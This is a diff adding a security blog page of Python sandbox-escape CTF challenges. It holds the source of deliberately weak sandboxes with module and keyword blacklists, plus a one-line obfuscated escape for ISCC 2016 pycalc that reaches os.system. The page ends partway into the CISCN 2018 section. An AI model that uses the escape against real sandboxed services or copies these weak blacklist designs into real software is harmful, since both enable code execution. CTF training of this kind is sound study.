@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Computer, Network, Security">
+    <meta name="description" content="a blog on Hexo">
+    <meta name="author" content="TyeYeah">
+    
+    <title>
+        
+            Python Sandbox Challenges |
+        
+        Relish the Moment
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/img/wang.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/img/aliwangwang.svg","favicon":"/img/wang.svg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                Relish the Moment
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">Python Sandbox Challenges</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/img/aliwangwang.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">TyeYeah</span>
+                        
+                            <span class="author-label">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2019-10-08 11:11:34
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Pwn/">Pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/sandbox-escape/">sandbox-escape</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/python/">python</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.5k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>9 Mins</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p>Here I collect several challenges for training and having fun.</p>
+<h2 id="Little-Puzzle"><a href="#Little-Puzzle" class="headerlink" title="Little Puzzle"></a>Little Puzzle</h2><p>Simple training comes first</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> future <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to my Python sandbox! Enter commands below!&quot;</span>)</span><br><span class="line"></span><br><span class="line">banned = [ </span><br><span class="line">    <span class="string">&quot;import&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">    <span class="string">&quot;eval&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pickle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>,</span><br><span class="line">    <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kevin sucks&quot;</span>,</span><br><span class="line">    <span class="string">&quot;input&quot;</span>,</span><br><span class="line">    <span class="string">&quot;banned&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cry sum more&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sys&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">targets = builtins.<span class="built_in">dict</span>.keys() </span><br><span class="line">targets.remove(<span class="string">&#x27;raw_input&#x27;</span>) </span><br><span class="line">targets.remove(<span class="string">&#x27;print&#x27;</span>) </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets: </span><br><span class="line">    <span class="keyword">del</span> builtins.<span class="built_in">dict</span>[x]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>: </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    data = raw_input()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No bueno&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># this means nobreak</span></span><br><span class="line">        <span class="built_in">exec</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span>():</span></span><br><span class="line">    UNSAFE = [<span class="string">&#x27;open&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;file&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;execfile&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;compile&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;reload&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;__import__&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;eval&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;input&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</span><br><span class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"><span class="comment"># Remove dangerous builtins</span></span><br><span class="line">make_secure()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Go Ahead, Expoit me &gt;;D&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Read user input until the first whitespace character</span></span><br><span class="line">        inp = findall(<span class="string">&#x27;\S+&#x27;</span>, raw_input())[<span class="number">0</span>]</span><br><span class="line">        a = <span class="literal">None</span></span><br><span class="line">        <span class="comment"># Set a to the result from executing the user input</span></span><br><span class="line">        <span class="built_in">exec</span> <span class="string">&#x27;a=&#x27;</span> + inp</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Return Value:&#x27;</span>, a</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Exception:&#x27;</span>, e</span><br></pre></td></tr></table></figure>
+
+<h2 id="Puzzle-2"><a href="#Puzzle-2" class="headerlink" title="Puzzle 2"></a>Puzzle 2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> future <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to my Python sandbox! Enter commands below!&quot;</span>)</span><br><span class="line"></span><br><span class="line">banned = [ </span><br><span class="line">    <span class="string">&quot;import&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">    <span class="string">&quot;eval&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pickle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>,</span><br><span class="line">    <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kevin sucks&quot;</span>,</span><br><span class="line">    <span class="string">&quot;input&quot;</span>,</span><br><span class="line">    <span class="string">&quot;banned&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cry sum more&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sys&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">targets = builtins.<span class="built_in">dict</span>.keys() </span><br><span class="line">targets.remove(<span class="string">&#x27;raw_input&#x27;</span>) </span><br><span class="line">targets.remove(<span class="string">&#x27;print&#x27;</span>) </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets: </span><br><span class="line">    <span class="keyword">del</span> builtins.<span class="built_in">dict</span>[x]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>: </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    data = raw_input()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No bueno&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># this means nobreak</span></span><br><span class="line">        <span class="built_in">exec</span> data</span><br></pre></td></tr></table></figure>
+<h2 id="Puzzle-3"><a href="#Puzzle-3" class="headerlink" title="Puzzle 3"></a>Puzzle 3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span>():</span></span><br><span class="line">    UNSAFE = [<span class="string">&#x27;open&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;file&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;execfile&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;compile&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;reload&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;__import__&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;eval&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;input&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</span><br><span class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove dangerous builtins</span></span><br><span class="line">make_secure()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Go Ahead, Expoit me &gt;;D&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Read user input until the first whitespace character</span></span><br><span class="line">        inp = findall(<span class="string">&#x27;\S+&#x27;</span>, raw_input())[<span class="number">0</span>]</span><br><span class="line">        a = <span class="literal">None</span></span><br><span class="line">        <span class="comment"># Set a to the result from executing the user input</span></span><br><span class="line">        <span class="built_in">exec</span> <span class="string">&#x27;a=&#x27;</span> + inp</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Return Value:&#x27;</span>, a</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Exception:&#x27;</span>, e</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="ISCC-2016-Pwn300-pycalc"><a href="#ISCC-2016-Pwn300-pycalc" class="headerlink" title="ISCC 2016 - Pwn300 pycalc"></a>ISCC 2016 - Pwn300 pycalc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span>():</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;=============================================&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;   Simple calculator implemented by python   &quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;=============================================&quot;</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getexp</span>():</span></span><br><span class="line">    <span class="keyword">return</span> raw_input(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_hook_import_</span>(<span class="params">name, *args, **kwargs</span>):</span></span><br><span class="line">    module_blacklist = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</span><br><span class="line">        <span class="keyword">if</span> name == forbid:        <span class="comment"># don&#x27;t let user import these modules</span></span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="built_in">format</span>(forbid))</span><br><span class="line">    <span class="comment"># normal modules can be imported</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(name, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sandbox_filter</span>(<span class="params">command</span>):</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;__getitem__&#x27;</span>, <span class="string">&#x27;__setitem__&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;os&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> forbid <span class="keyword">in</span> command:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sandbox_exec</span>(<span class="params">command</span>):</span>      <span class="comment"># sandbox user input</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    __sandboxed_builtins__ = <span class="built_in">dict</span>(__builtins__.__dict__)</span><br><span class="line">    __sandboxed_builtins__[<span class="string">&#x27;__import__&#x27;</span>] = _hook_import_    <span class="comment"># hook import</span></span><br><span class="line">    <span class="keyword">del</span> __sandboxed_builtins__[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    _<span class="keyword">global</span> = &#123;</span><br><span class="line">        <span class="string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> sandbox_filter(command) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Malicious user input detected!!!&#x27;</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    command = <span class="string">&#x27;result = &#x27;</span> + command</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span> command <span class="keyword">in</span> _<span class="keyword">global</span>     <span class="comment"># do calculate in a sandboxed environment</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="built_in">print</span> e</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    result = _<span class="keyword">global</span>[<span class="string">&#x27;result&#x27;</span>]  <span class="comment"># extract the result</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">banner()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    command = getexp()</span><br><span class="line">    <span class="built_in">print</span> sandbox_exec(command)</span><br></pre></td></tr></table></figure>
+<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;types&#x27;</span>).__builtins__[<span class="string">&#x27;__tropmi__&#x27;</span>[::-<span class="number">1</span>]](<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]), <span class="string">&#x27;mets&#x27;</span> <span class="string">&#x27;ys&#x27;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="CISCN-2018-RUN"><a href="#CISCN-2018-RUN" class="headerlink" title="CISCN 2018 - RUN"></a>CISCN 2018 - RUN</h2><p>This one belongs to pwn.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span 